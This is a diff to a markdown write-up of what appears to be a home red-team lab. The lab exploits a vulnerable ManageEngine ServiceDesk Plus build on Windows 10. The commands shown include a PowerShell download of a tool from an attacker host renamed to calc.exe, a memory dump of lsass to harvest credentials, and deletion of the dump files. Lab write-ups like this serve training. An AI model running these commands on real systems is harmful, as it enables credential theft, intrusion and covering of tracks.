@@ -4,7 +4,6 @@
 
 ![](LabSchema.png)
 
-
 ## Environment Setup
 - Victim Machine: Windows 10 has:
     -  Vulnerable ManageEngine ServiceDesk Plus build 11303 found on the [ManageEngine Archives](https://archives.manageengine.com/service-desk/11303/)
@@ -13,8 +12,17 @@
 - Attacker Machine: Kali Linux
 - Server: Windows 10
 
+<br>
+
+## Planning
+- This Lab will consists of two parts:
+    - Part 1: Initial Access & Credentials Dump
+    - Part 2: Lateral Movement & Stealing Data
+
+<br>
+
 ## Let's Go
-### - Part 1:
+### - Part 1: Initial Access & Credentials Dump
 
 #### a. Applying The Exploit:
 ![image](https://github.com/user-attachments/assets/d39fde33-273d-403c-9195-8dac52d64db1)
@@ -40,6 +48,8 @@ lsass.exe                      652 Services                   0     16,848 K
 #### h. `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file2.exe', 'C:\windows\temp\calc.exe')`
 #### k. `C:\windows\temp\calc.exe -accepteula -ma 652 C:\Windows\Temp\logct2.dmp`
 #### l. Delete both of them `Remove-Item -Path "C:\Windows\Temp\logct2.dmp", "C:\Windows\Temp\logctl.zip"`
+
+<br>
 
 ### - Part 2: Lateral Movement & Stealing Data
 
